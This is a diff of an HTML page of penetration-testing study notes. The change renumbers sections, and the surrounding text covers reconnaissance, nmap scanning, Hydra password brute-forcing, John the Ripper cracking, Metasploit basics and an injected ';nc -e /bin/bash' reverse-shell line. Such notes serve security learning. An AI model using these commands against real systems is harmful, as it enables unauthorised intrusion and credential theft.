@@ -266,37 +266,41 @@
 <li><a href="#return-values"><span class="toc-section-number">1.4.10.2</span> Return Values</a></li>
 </ul></li>
 <li><a href="#debugging"><span class="toc-section-number">1.4.11</span> Debugging</a></li>
-<li><a href="#cheat-sheet"><span class="toc-section-number">1.4.12</span> Cheat Sheet</a>
-<ul>
-<li><a href="#dig"><span class="toc-section-number">1.4.12.1</span> DIG</a></li>
-<li><a href="#project-sonar"><span class="toc-section-number">1.4.12.2</span> Project Sonar</a></li>
-<li><a href="#certificates"><span class="toc-section-number">1.4.12.3</span> Certificates</a></li>
+<li><a href="#cheat-sheet"><span class="toc-section-number">1.4.12</span> Cheat Sheet</a></li>
 </ul></li>
-<li><a href="#active-information-gathering"><span class="toc-section-number">1.4.13</span> Active Information Gathering</a>
+<li><a href="#information-gathering"><span class="toc-section-number">1.5</span> Information Gathering</a>
 <ul>
-<li><a href="#http-header"><span class="toc-section-number">1.4.13.1</span> HTTP Header</a></li>
-<li><a href="#whatweb"><span class="toc-section-number">1.4.13.2</span> WhatWeb</a></li>
+<li><a href="#passive-information-gathering"><span class="toc-section-number">1.5.1</span> Passive Information Gathering</a>
+<ul>
+<li><a href="#dig"><span class="toc-section-number">1.5.1.1</span> DIG</a></li>
+<li><a href="#project-sonar"><span class="toc-section-number">1.5.1.2</span> Project Sonar</a></li>
+<li><a href="#certificates"><span class="toc-section-number">1.5.1.3</span> Certificates</a></li>
+</ul></li>
+<li><a href="#active-information-gathering"><span class="toc-section-number">1.5.2</span> Active Information Gathering</a>
+<ul>
+<li><a href="#http-header"><span class="toc-section-number">1.5.2.1</span> HTTP Header</a></li>
+<li><a href="#whatweb"><span class="toc-section-number">1.5.2.2</span> WhatWeb</a></li>
 </ul></li>
 </ul></li>
-<li><a href="#exploiting-network-services"><span class="toc-section-number">1.5</span> Exploiting Network Services</a>
+<li><a href="#exploiting-network-services"><span class="toc-section-number">1.6</span> Exploiting Network Services</a>
 <ul>
-<li><a href="#github-repos"><span class="toc-section-number">1.5.1</span> GitHub Repos</a></li>
-<li><a href="#ssh"><span class="toc-section-number">1.5.2</span> SSH</a></li>
-<li><a href="#nmap"><span class="toc-section-number">1.5.3</span> NMAP</a></li>
-<li><a href="#ftp"><span class="toc-section-number">1.5.4</span> FTP</a>
+<li><a href="#github-repos"><span class="toc-section-number">1.6.1</span> GitHub Repos</a></li>
+<li><a href="#ssh"><span class="toc-section-number">1.6.2</span> SSH</a></li>
+<li><a href="#nmap"><span class="toc-section-number">1.6.3</span> NMAP</a></li>
+<li><a href="#ftp"><span class="toc-section-number">1.6.4</span> FTP</a>
 <ul>
-<li><a href="#hydra"><span class="toc-section-number">1.5.4.1</span> Hydra</a></li>
+<li><a href="#hydra"><span class="toc-section-number">1.6.4.1</span> Hydra</a></li>
 </ul></li>
-<li><a href="#nfs"><span class="toc-section-number">1.5.5</span> NFS</a></li>
-<li><a href="#smtp"><span class="toc-section-number">1.5.6</span> SMTP</a></li>
-<li><a href="#metasploit"><span class="toc-section-number">1.5.7</span> Metasploit</a></li>
-<li><a href="#mysql"><span class="toc-section-number">1.5.8</span> MySQL</a></li>
-<li><a href="#john-the-ripper"><span class="toc-section-number">1.5.9</span> John the Ripper</a></li>
+<li><a href="#nfs"><span class="toc-section-number">1.6.5</span> NFS</a></li>
+<li><a href="#smtp"><span class="toc-section-number">1.6.6</span> SMTP</a></li>
+<li><a href="#metasploit"><span class="toc-section-number">1.6.7</span> Metasploit</a></li>
+<li><a href="#mysql"><span class="toc-section-number">1.6.8</span> MySQL</a></li>
+<li><a href="#john-the-ripper"><span class="toc-section-number">1.6.9</span> John the Ripper</a></li>
 </ul></li>
-<li><a href="#web-fundamentals"><span class="toc-section-number">1.6</span> Web Fundamentals</a>
+<li><a href="#web-fundamentals"><span class="toc-section-number">1.7</span> Web Fundamentals</a>
 <ul>
-<li><a href="#curl"><span class="toc-section-number">1.6.1</span> Curl</a></li>
-<li><a href="#reverse-shell"><span class="toc-section-number">1.6.2</span> Reverse Shell</a></li>
+<li><a href="#curl"><span class="toc-section-number">1.7.1</span> Curl</a></li>
+<li><a href="#reverse-shell"><span class="toc-section-number">1.7.2</span> Reverse Shell</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -865,24 +869,26 @@ echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
 <h3 data-number="1.4.11" id="debugging"><span class="header-section-number">1.4.11</span> Debugging</h3>
 <p>Bash allows us to debug our code by using the “<code>-x</code>” (<code>xtrace</code>) and “<code>-v</code>” (<code>verbose</code>) options.</p>
 <h3 data-number="1.4.12" id="cheat-sheet"><span class="header-section-number">1.4.12</span> Cheat Sheet</h3>
-<p>For more information about bash scripting have a look in the following cheat sheet: https://devhints.io/bash ## Information Gathering ### Passive Information Gathering</p>
+<p>For more information about bash scripting have a look in the following cheat sheet: https://devhints.io/bash</p>
+<h2 data-number="1.5" id="information-gathering"><span class="header-section-number">1.5</span> Information Gathering</h2>
+<h3 data-number="1.5.1" id="passive-information-gathering"><span class="header-section-number">1.5.1</span> Passive Information Gathering</h3>
 <p><code>whois</code> can be used for querying domain names, IP addresses, or autonomous systems.</p>
-<h4 data-number="1.4.12.1" id="dig"><span class="header-section-number">1.4.12.1</span> DIG</h4>
+<h4 data-number="1.5.1.1" id="dig"><span class="header-section-number">1.5.1.1</span> DIG</h4>
 <p><code>dig</code> is a DNS lookup utility.</p>
 <p><code>WaybackMachine</code> is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.</p>
 <pre class="shell"><code>$ dig any google.com @8.8.8.8</code></pre>
 <pre><code>*(any         = query all types of records
   @8.8.8.8    = define a dns server from which you wnat to retrieve the information)</code></pre>
-<h4 data-number="1.4.12.2" id="project-sonar"><span class="header-section-number">1.4.12.2</span> Project Sonar</h4>
+<h4 data-number="1.5.1.2" id="project-sonar"><span class="header-section-number">1.5.1.2</span> Project Sonar</h4>
 <p>To find all available subdomains we can use <code>Project Sonar</code>:</p>
 <pre class="shell"><code>$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
-<h4 data-number="1.4.12.3" id="certificates"><span class="header-section-number">1.4.12.3</span> Certificates</h4>
+<h4 data-number="1.5.1.3" id="certificates"><span class="header-section-number">1.5.1.3</span> Certificates</h4>
 <p>To gain more information we can search for certificates at sites like <code>https://crt.sh</code> and <code>https://search.censys.io/certificates</code>.</p>
-<h3 data-number="1.4.13" id="active-information-gathering"><span class="header-section-number">1.4.13</span> Active Information Gathering</h3>
+<h3 data-number="1.5.2" id="active-information-gathering"><span class="header-section-number">1.5.2</span> Active Information Gathering</h3>
 <p><code>Wappalyzer</code> is a browser extension which finds out what technologies are used on a website.</p>
 <p><code>WAFW00F</code> is a Web Application Firewall Fingerprinting Tool.</p>
 <p><code>Aquatone</code> is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.</p>
-<h4 data-number="1.4.13.1" id="http-header"><span class="header-section-number">1.4.13.1</span> HTTP Header</h4>
+<h4 data-number="1.5.2.1" id="http-header"><span class="header-section-number">1.5.2.1</span> HTTP Header</h4>
 <p>We can gain information about the version of the web server and the operating system with the curl flag <code>-I</code> which returns us the <code>http header</code>:</p>
 <pre class="shell"><code>$ curl -I &quot;http://${TARGET}&quot;</code></pre>
 <p><code>X-Powered-By header</code> can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.</p>
@@ -892,31 +898,31 @@ echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
 <li>PHP: PHPSESSID=<COOKIE_VALUE></li>
 <li>JAVA: JSESSION=<COOKIE_VALUE></li>
 </ul>
-<h4 data-number="1.4.13.2" id="whatweb"><span class="header-section-number">1.4.13.2</span> WhatWeb</h4>
+<h4 data-number="1.5.2.2" id="whatweb"><span class="header-section-number">1.5.2.2</span> WhatWeb</h4>
 <p><code>WhatWeb</code> is a Web scanner - identify technologies used by websites.</p>
 <pre class="shell"><code>$ whatweb -a 1 https://www.facebook.com -v</code></pre>
 <pre><code>*(-a    = Set the aggression level. 1(low) - 4(high) 
   -v    = verbose)</code></pre>
 <!-- USE wafwoof to detect the CMS!!! -->
-<h2 data-number="1.5" id="exploiting-network-services"><span class="header-section-number">1.5</span> Exploiting Network Services</h2>
-<h3 data-number="1.5.1" id="github-repos"><span class="header-section-number">1.5.1</span> GitHub Repos</h3>
+<h2 data-number="1.6" id="exploiting-network-services"><span class="header-section-number">1.6</span> Exploiting Network Services</h2>
+<h3 data-number="1.6.1" id="github-repos"><span class="header-section-number">1.6.1</span> GitHub Repos</h3>
 <p>SecLists: https://github.com/danielmiessler/SecLists</p>
-<h3 data-number="1.5.2" id="ssh"><span class="header-section-number">1.5.2</span> SSH</h3>
+<h3 data-number="1.6.2" id="ssh"><span class="header-section-number">1.6.2</span> SSH</h3>
 <p>Authenticate via ssh with the key-file <code>id_rsa</code>:</p>
 <div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
 <pre class="text"><code>*(-i [file]  = Identity file)</code></pre>
-<h3 data-number="1.5.3" id="nmap"><span class="header-section-number">1.5.3</span> NMAP</h3>
+<h3 data-number="1.6.3" id="nmap"><span class="header-section-number">1.6.3</span> NMAP</h3>
 <p>Checks open ports in defined range and check running services with <code>Nmap</code>:</p>
 <div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p</span> 0-60000</span></code></pre></div>
 <pre class="text"><code>*(-p-  = Scans the whole portrange
   -p   = Specific port or portrange
   -sV  = Attempts to determine the version of the service running on port
   -A   = Enables OS detection, version detection, script scanning and traceroute)</code></pre>
-<h3 data-number="1.5.4" id="ftp"><span class="header-section-number">1.5.4</span> FTP</h3>
+<h3 data-number="1.6.4" id="ftp"><span class="header-section-number">1.6.4</span> FTP</h3>
 <p>Download a File from an FTP-Server with <code>Wget</code>:</p>
 <div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
 <pre class="text"><code>*(-m = --mirror)</code></pre>
-<h4 data-number="1.5.4.1" id="hydra"><span class="header-section-number">1.5.4.1</span> Hydra</h4>
+<h4 data-number="1.6.4.1" id="hydra"><span class="header-section-number">1.6.4.1</span> Hydra</h4>
 <p>Use <code>Hydra</code> for cracking password in our example on an FTP-Service:</p>
 <div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
 <pre class="text"><code>*(-t 4      = Number of parallel connections per target
@@ -925,7 +931,7 @@ echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [ftp]     = Sets the protocol)</code></pre>
-<h3 data-number="1.5.5" id="nfs"><span class="header-section-number">1.5.5</span> NFS</h3>
+<h3 data-number="1.6.5" id="nfs"><span class="header-section-number">1.6.5</span> NFS</h3>
 <p>List name or <code>NFS</code> shares:</p>
 <div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
 <pre class="text"><code>*(-e    = Shows the NSF server&#39;s export list
@@ -935,19 +941,19 @@ echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
 <pre class="text"><code>*(-t nfs    = Type of device to mount, then specifying that it&#39;s NFS
   IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
   -nolock   = Specifies not to use NLM locking)</code></pre>
-<h3 data-number="1.5.6" id="smtp"><span class="header-section-number">1.5.6</span> SMTP</h3>
+<h3 data-number="1.6.6" id="smtp"><span class="header-section-number">1.6.6</span> SMTP</h3>
 <p>There are three relevant commands, when it comes to <code>SMTP</code>:</p>
 <pre class="text"><code>(VRFY    = Confirming the names of valid users
  EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
  RCPT TO = Specifies the e-mail address of the recipient)</code></pre>
-<h3 data-number="1.5.7" id="metasploit"><span class="header-section-number">1.5.7</span> Metasploit</h3>
+<h3 data-number="1.6.7" id="metasploit"><span class="header-section-number">1.6.7</span> Metasploit</h3>
 <pre class="text"><code>*(search [name]                 = Search for a module and his description
   use [name]                    = Selects a module by name
   options                       = When a module is selected we will see the options of the module
   set [option] [parameter]      = Set a specific option with a specific parameter
   run                           = Run the exploit)</code></pre>
 <p>For further information see the following documentation: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/</p>
-<h3 data-number="1.5.8" id="mysql"><span class="header-section-number">1.5.8</span> MySQL</h3>
+<h3 data-number="1.6.8" id="mysql"><span class="header-section-number">1.6.8</span> MySQL</h3>
 <p>First we need a client, which is in our case <code>default-mysql-client</code>:</p>
 <div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
@@ -966,7 +972,7 @@ $ nmap --script=mysql-enum [target]</code></pre>
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)</code></pre>
-<h3 data-number="1.5.9" id="john-the-ripper"><span class="header-section-number">1.5.9</span> John the Ripper</h3>
+<h3 data-number="1.6.9" id="john-the-ripper"><span class="header-section-number">1.6.9</span> John the Ripper</h3>
 <p>If we have a hash which look something like the following example:</p>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
@@ -976,8 +982,8 @@ $ nmap --script=mysql-enum [target]</code></pre>
 <span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
-<h2 data-number="1.6" id="web-fundamentals"><span class="header-section-number">1.6</span> Web Fundamentals</h2>
-<h3 data-number="1.6.1" id="curl"><span class="header-section-number">1.6.1</span> Curl</h3>
+<h2 data-number="1.7" id="web-fundamentals"><span class="header-section-number">1.7</span> Web Fundamentals</h2>
+<h3 data-number="1.7.1" id="curl"><span class="header-section-number">1.7.1</span> Curl</h3>
 <p>If we want to get sources of a webpage, we can do this with <code>Curl</code>:</p>
 <div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
 <pre class="text"><code>*(-X [GET]          = Set kind of fetch
@@ -987,7 +993,7 @@ $ nmap --script=mysql-enum [target]</code></pre>
 <p><code>WPSCAN</code> scans the Word Press version.</p>
 <p><code>Gobuster</code> is a tool used to brute-force URIs including directories and files as well as DNS subdomains.</p>
 <p><code>DIRB</code> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.</p>
-<h3 data-number="1.6.2" id="reverse-shell"><span class="header-section-number">1.6.2</span> Reverse Shell</h3>
+<h3 data-number="1.7.2" id="reverse-shell"><span class="header-section-number">1.7.2</span> Reverse Shell</h3>
 <pre class="shell"><code>$ ;nc -e /bin/bash</code></pre>
 <p>For more information checkout the following GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
 <p>If you gain access depending on the OS you can try the following commands to get more information: &gt;Linux</p>
